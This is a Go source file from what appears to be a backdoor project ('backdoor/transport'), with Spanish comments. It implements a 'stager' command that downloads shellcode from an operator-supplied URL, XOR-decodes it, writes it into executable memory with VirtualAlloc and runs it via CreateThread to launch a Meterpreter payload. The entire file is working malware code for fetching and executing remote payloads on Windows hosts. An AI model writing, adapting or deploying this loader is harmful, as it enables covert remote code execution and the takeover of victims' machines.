package handler

import (
	"backdoor/transport"
	"bufio"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

func StagerHandler(t transport.Transport, args []string) {
	if len(args) == 0 {
		t.Write([]byte("Uso: stager <URL>\n"))
		return
	}
	url := args[0]
	log.Printf("[*] Ejecutando stager desde URL: %s", url)

	err := RunMeterpreterStager(url)
	if err != nil {
		log.Printf("Error ejecutando stager: " + err.Error() + "\n")
		t.Write([]byte("Error ejecutando stager: " + err.Error() + "\n"))
	} else {
		t.Write([]byte("Stager ejecutado exitosamente\n"))
	}

	// Espera explícita para depuración o evitar cierre inmediato
	t.Write([]byte("Presiona enter para continuar...\n"))
	bufio.NewReader(os.Stdin).ReadBytes('\n')

	// Si querés detener el programa después del stager:
	// os.Exit(0)
}

func RunMeterpreterStager(url string) error {
	log.Println("[*] Descargando shellcode > ", url)

	resp, err := http.Get(url)
	if err != nil {
		log.Printf("Error al descargar el shellcode: %v", err)
		return err
	}
	defer resp.Body.Close()

	shellcode, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Printf("Error al leer shellcode: %v", err)
		return err
	}

	if len(shellcode) == 0 {
		log.Printf("Shellcode vacío")
		return fmt.Errorf("shellcode vacío")
	}
	key := byte(0xAA)
	for i := range shellcode {
		shellcode[i] ^= key
	}

	// Reservar memoria con permisos de ejecución
	addr, _, errVirtualAlloc := syscall.NewLazyDLL("kernel32.dll").
		NewProc("VirtualAlloc").
		Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		log.Printf("fallo VirtualAlloc: %v", errVirtualAlloc)
		return fmt.Errorf("fallo VirtualAlloc: %v", errVirtualAlloc)
	}

	// Copiar el shellcode a la memoria alocada
	mem := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(shellcode))
	copy(mem, shellcode)

	log.Printf("Shellcode cargado en memoria en 0x%x", addr)

	// Ejecutar usando CreateThread
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	createThread := kernel32.NewProc("CreateThread")
	waitForSingleObject := kernel32.NewProc("WaitForSingleObject")

	thread, _, errThread := createThread.Call(
		0,    // lpThreadAttributes
		0,    // dwStackSize
		addr, // lpStartAddress (donde está el shellcode)
		0,    // lpParameter
		0,    // dwCreationFlags
		0,    // lpThreadId
	)
	if thread == 0 {
		log.Printf("Error en CreateThread: %v", errThread)
		return fmt.Errorf("CreateThread falló: %v", errThread)
	}

	log.Println("Shellcode ejecutado en un nuevo hilo")

	// Esperar a que termine (evita que el proceso se cierre antes de que el shellcode actúe)
	waitForSingleObject.Call(thread, syscall.INFINITE)

	return nil
}

// Función auxiliar
func waitForEnter() {
	fmt.Println("Presiona Enter para salir...")
	bufio.NewReader(os.Stdin).ReadBytes('\n')
}
